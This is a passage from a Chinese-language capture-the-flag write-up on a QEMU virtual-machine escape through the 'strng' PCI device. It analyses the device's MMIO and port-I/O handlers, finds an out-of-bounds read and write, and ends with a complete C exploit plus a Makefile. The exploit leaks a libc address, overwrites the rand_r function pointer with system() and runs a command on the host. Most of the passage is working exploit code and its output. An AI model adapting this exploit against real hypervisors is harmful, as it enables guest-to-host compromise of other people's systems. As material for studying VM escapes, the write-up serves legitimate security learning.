static void strng_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned size)
{
    STRNGState *strng = opaque;
    uint32_t saddr;

    if (size != 4 || addr & 3)
        return;

    saddr = addr >> 2;
    switch (saddr) {
    case 0:
        strng->srand(val);
        break;

    case 1:
        strng->regs[saddr] = strng->rand();
        break;

    case 3:
        strng->regs[saddr] = strng->rand_r(&strng->regs[2]);

    default:
        strng->regs[saddr] = val;
    }
}

```

这里可以执行 `rand_r`，参数是可控的 `regs[2]`，如果能劫持 `rand_r`，改成 `system()`，就能拿 flag。

如果需要执行的命令过长，还需要写 `regs[3], regs[4]...` ，saddr 为 3 时，写入 `regs[3]` 的是 `strng->rand_r` 的返回值，但是这个 case 没写 break，还是会执行 `strng->regs[3] = val`

addr 是传入的，看上去可以越界，但是传入的 addr 不能超过 mmio size 256，而 regs 是 `uint32_t regs[64]`，恰好是 256，所以 mmio 越界不可行。



##### strng_mmio_read

```c
static uint64_t strng_mmio_read(void *opaque, hwaddr addr, unsigned size)
{
    STRNGState *strng = opaque;

    if (size != 4 || addr & 3)
        return ~0ULL;

    return strng->regs[addr >> 2];
}
```



#### pmio

```c
static const MemoryRegionOps strng_pmio_ops = {
    .read = strng_pmio_read,
    .write = strng_pmio_write,
    .endianness = DEVICE_LITTLE_ENDIAN,
};
```



##### strng_pmio_write

```c
static void strng_pmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned size)
{
    STRNGState *strng = opaque;
    uint32_t saddr;

    if (size != 4)
        return;

    switch (addr) {
    case STRNG_PMIO_ADDR:
        strng->addr = val;
        break;

    case STRNG_PMIO_DATA:
        if (strng->addr & 3)
            return;

        saddr = strng->addr >> 2;
        switch (saddr) {
        case 0:
            strng->srand(val);
            break;

        case 1:
            strng->regs[saddr] = strng->rand();
            break;

        case 3:
            strng->regs[saddr] = strng->rand_r(&strng->regs[2]);
            break;

        default:
            strng->regs[saddr] = val;
        }
    }
}

```

传入的 addr 决定是写地址还是数据，`regs[saddr]` 中的 saddr 是 `strng->addr >> 2` 得到的。

传入 addr 为 0 时，可以控制 `strng->addr`，所以这里存在越界写，步骤如下：

1. 传入 addr 为 0，pmio_write 将 `strng->addr` 写为所需偏移
2. 传入 addr 为 4，pmio_write  在目标位置写入目标值。



##### strng_pmio_read

```c
static uint64_t strng_pmio_read(void *opaque, hwaddr addr, unsigned size)
{
    STRNGState *strng = opaque;
    uint64_t val = ~0ULL;

    if (size != 4)
        return val;

    switch (addr) {
    case STRNG_PMIO_ADDR:
        val = strng->addr;
        break;

    case STRNG_PMIO_DATA:
        if (strng->addr & 3)
            return val;

        val = strng->regs[strng->addr >> 2];
    }

    return val;
}
```

同上，存在越界读，步骤如下：

1. 传入 addr 为 0，pmio_write 将 `strng->addr` 写为所需偏移
2. 传入 addr 为 4，pmio_read  读取目标值。



#### 思路

1. mmio_write 写 `regs[2]` 布置参数
2. 越界读，泄露 `srand()` 地址，计算 libc 基址。
3. 越界写，写 `strng->rand_r` 低四字节，改成 `system()`。
4. 执行 `strng->rand_r(&strng->regs[2])`。

跑 exp 的时候可能出现 ` sh: 1: Syntax error: word unexpected (expecting ")")`，再跑一次就行。

```
sh: 1: Syntax error: word unexpected (expecting ")")
cat: -: Resource temporarily unavailable
flag{test}
```

所以 exp 中不要通过泄露 `rand_r()` 计算 libc 基址，因为 exp 一次可能跑不出 flag，但是跑一次之后 `rand_r()` 就修改成 `system()` 了，再跑地址全乱了，导致 crash。



#### exp

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/io.h>
#include <inttypes.h>

const uint32_t pmio_base = 0xc050;
const uint64_t system_libc = 0x55410;
const uint64_t srand_libc = 0x4a740;
uint64_t mmio_mem;

void mmio_write(uint32_t addr, uint32_t val) {
    *((uint32_t*)(mmio_mem + addr)) = val;
}

uint32_t mmio_read(uint32_t addr) {
    return *((uint32_t*)(mmio_mem + addr));
}

void pmio_write(uint32_t addr, uint32_t val) {
    outl(val, addr);
}

uint32_t pmio_read(uint32_t addr) {
    return (uint32_t)inl(addr);
}

uint32_t fuck_read(uint32_t addr) {
    pmio_write(pmio_base, addr);//fuck addr
    return pmio_read(pmio_base + 4);
}

void fuck_write(uint32_t addr, uint32_t val) {
    pmio_write(pmio_base, addr);//fuck addr
    pmio_write(pmio_base + 4, val);
}

int main() {
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR|O_SYNC);
    if(mmio_fd < 0){
        puts("[-] open failed");
    }
    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if(mmio_mem == MAP_FAILED){
        puts("[-] mmio failed");
    }
    if(iopl(3)){
        puts("[-] pmio failed");
    }

    mmio_write(2<<2, 0x20746163);//fuck regs[2]
    mmio_write(3<<2, 0x67616c66);//fuck regs[3]
    mmio_write(4<<2, 0x00000000);//fuck regs[4]

    uint64_t srand_addr = fuck_read(66<<2);
    srand_addr <<= 32;
    srand_addr += fuck_read(65<<2);
     printf("[+] srand ==> %#llx\n", srand_addr);
    uint64_t libc_base = srand_addr - srand_libc;
    printf("[+] libc_base ==> %#llx\n", libc_base);
    uint64_t system_addr = libc_base + system_libc;
    printf("[+] system ==> %#llx\n", system_addr);
    fuck_write(69<<2, system_addr&0xffffffff);//fuck rand_r
    mmio_write(3<<2,0);//system("cat flag");
    return 0;

}

```

Makefile

```makefile
exp:
	gcc exp.c -m32 -static -o exp && strip exp
clean:
	rm exp
```

